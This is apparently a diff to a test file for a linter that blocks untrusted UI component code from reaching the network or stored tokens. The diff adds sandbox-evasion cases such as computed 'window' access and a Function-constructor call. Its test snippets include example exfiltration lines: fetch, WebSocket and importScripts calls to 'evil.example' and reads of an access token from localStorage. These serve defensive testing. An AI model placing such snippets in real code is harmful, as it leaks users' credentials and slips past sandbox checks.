@@ -45,6 +45,9 @@ describe("component-source-gate lists", () => {
       bannedGlobals: gate.bannedGlobals,
       bannedCallables: gate.bannedCallables,
       bannedMemberAccess: gate.bannedMemberAccess,
+      bannedMemberCalls: gate.bannedMemberCalls,
+      bannedComputedAccess: gate.bannedComputedAccess,
+      bannedSyntax: gate.bannedSyntax,
     })) {
       expect(`${name}:${JSON.stringify(list)}`).toEqual(
         `${name}:${JSON.stringify([...new Set(list)].sort())}`,
@@ -82,7 +85,7 @@ describe("componentGlobalsLint — the exfiltration class", () => {
   it.each([
     ["bare fetch", `fetch("https://evil.example/collect", { method: "POST" })`],
     ["window.fetch", `window.fetch("https://evil.example/collect")`],
-    ["globalThis.fetch", `globalThis["x"]; globalThis.fetch("https://evil.example")`],
+    ["globalThis.fetch", `globalThis.fetch("https://evil.example")`],
     ["XMLHttpRequest", `const x = new XMLHttpRequest();`],
     ["WebSocket", `const s = new WebSocket("wss://evil.example");`],
     ["EventSource", `const e = new EventSource("https://evil.example");`],
@@ -93,11 +96,33 @@ describe("componentGlobalsLint — the exfiltration class", () => {
     ["importScripts", `importScripts("https://evil.example/x.js");`],
     ["localStorage", `const t = localStorage.getItem("sb-access-token");`],
     ["sessionStorage", `const t = sessionStorage.getItem("sb-access-token");`],
+    // DD-124 — three shapes the gate and/or the trigger accepted until
+    // 2026-09-11 (V-17 F3/F4, proven live).
+    [".constructor( evaluator", `const q = (()=>{}).constructor("return 1")();`],
+    ["window[ computed access", `const f = window["fet" + "ch"];`],
+    ["globalThis[ computed access", `const f = globalThis[name];`],
+    ["self[ computed access", `const f = self[name];`],
   ])("refuses %s", (_label, snippet) => {
     const refusal = componentGlobalsLint(
       `export default function C({ data }) { ${snippet} return null; }`,
     );
-    expect(refusal).toMatch(/^This component uses "/);
+    expect(refusal).toMatch(/^This component /);
+  });
+
+  it("does NOT refuse reading .constructor without calling it", () => {
+    // `x.constructor.name` is an honest type label; only the CALL reaches the
+    // evaluator.
+    expect(componentGlobalsLint(`const label = data.constructor.name;`)).toBeNull();
+  });
+
+  it("does NOT refuse bracket access on ordinary values", () => {
+    // Only the global ROOTS lose bracket access. Indexing data is what these
+    // components are for.
+    expect(
+      componentGlobalsLint(
+        `const first = data.items[0]; const v = row[key]; const w = props["title"];`,
+      ),
+    ).toBeNull();
   });
 
   it("does NOT refuse a TypeScript type named with the word Function", () => {
